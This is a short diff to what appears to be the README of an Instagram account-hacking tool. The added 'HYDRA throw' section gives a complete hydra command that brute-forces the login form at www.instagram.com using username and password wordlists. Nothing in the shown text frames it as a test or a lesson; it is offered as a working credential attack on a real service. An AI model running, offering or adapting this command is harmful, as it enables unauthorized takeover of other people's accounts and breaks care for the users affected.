@@ -23,3 +23,8 @@ bash instkshell.sh
 # SCREENSHOT 
 
 ![CAPTURE 1](https://github.com/Khalidhusain786/instk/blob/main/khalid.jpg)
+
+# HYDRA throw
+
+hydra -l usernames.txt -P passwords.txt www.instagram.com http-post-form "/login/?next=/": "_username=^USER^&_password=^PASS^:F=incorrect" -V
+
